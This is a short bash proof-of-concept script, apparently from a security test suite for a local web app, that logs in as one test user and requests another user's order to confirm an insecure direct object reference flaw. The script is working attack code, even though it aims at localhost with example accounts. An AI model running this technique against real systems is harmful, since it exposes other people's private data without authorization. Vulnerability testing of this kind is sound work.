#!/usr/bin/env bash
set -e

# ==============================================================================
# Break Script 01: Insecure Direct Object Reference (IDOR / BOLA)
# ==============================================================================
# Target: GET /api/orders/[id]
# Attack Flow:
# 1. Log in as User A (usera@example.com)
# 2. Extract session cookie
# 3. Request User B's order ORD-201 without authorization check
# ==============================================================================

BASE_URL="${BASE_URL:-http://localhost:3000}"
COOKIE_JAR="/tmp/flowvault_cookie_usera.txt"

echo "[*] Authenticating as User A (usera@example.com)..."
LOGIN_RES=$(curl -s -c "${COOKIE_JAR}" -X POST "${BASE_URL}/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email": "usera@example.com", "password": "Password123!"}')

echo "[+] Authentication Response: ${LOGIN_RES}"

echo ""
echo "[*] Attempting IDOR access to User B's order: ORD-201..."
ORDER_RES=$(curl -s -b "${COOKIE_JAR}" "${BASE_URL}/api/orders/ORD-201")

echo "[+] Server Response (Order ORD-201):"
echo "${ORDER_RES}" | node -e '
  const fs = require("fs");
  const input = fs.readFileSync(0, "utf-8");
  try {
    const json = JSON.parse(input);
    console.log(JSON.stringify(json, null, 2));
    if (json.order && json.order.user_email === "userb@example.com") {
      console.log("\n[!] VULNERABILITY CONFIRMED: User A accessed User B confidential order!");
    }
  } catch {
    console.log(input);
  }
'
rm -f "${COOKIE_JAR}"
